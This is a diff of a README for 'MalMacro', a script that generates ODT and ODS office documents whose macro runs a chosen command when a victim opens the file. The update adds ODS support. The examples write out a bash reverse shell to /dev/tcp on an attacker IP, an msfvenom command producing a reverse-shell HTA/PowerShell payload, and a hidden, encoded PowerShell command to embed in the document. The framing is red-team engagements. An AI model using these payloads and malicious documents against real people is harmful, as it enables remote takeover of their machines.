@@ -1,20 +1,23 @@
 ## Malicious VBA Macro Generator
-One general way to gain a foothold on a user's machine in a red-teaming engagement is the use of delivering a document that has a macro enabled that executes a command, which is triggered upon the user opening the document. This program generates one such document in ODT format (I may add Word, Excel and ODS documents later).
+One general way to gain a foothold on a user's machine in a red-teaming engagement is the use of delivering a document that has a macro enabled that executes a command, which is triggered upon the user opening the document. This program generates one such document in ODT format (I may add Word, and Excel documents later).
 
-### Update
+### Update 2
+MalMacro now supports ODS files.
+
+### Update 1
 MalMacro now supports commands of arbitrary length. This has particular application to obfuscated powershell commands, which can be extremely lengthy.
 
 Examples:
 
 ```bash
 $ python malmacro.py
-Usage: malmacro.py <code_to_execute>
+Usage: malmacro.py <odt|ods> <code_to_execute>
 
-$ python malmacro.py "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"
+$ malmacro.py odt "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"
 
 # malmacro.odt generated
 $ ls
-macro.odt  malmacro.odt  malmacro.py
+LICENSE  macro.ods  macro.odt  malmacro.odt  malmacro.py  README.md
 
 # Generate hta payload with msfvenom:
 $  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh
@@ -37,7 +40,7 @@ Final size of hta-psh file: 7378 bytes
 </script>
 
 # Take powershell code to make malicious macro document
-$ ./malmacro.py 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAG<SNIP>'
+$ ./malmacro.py ods 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAG<SNIP>'
 
 ```
 
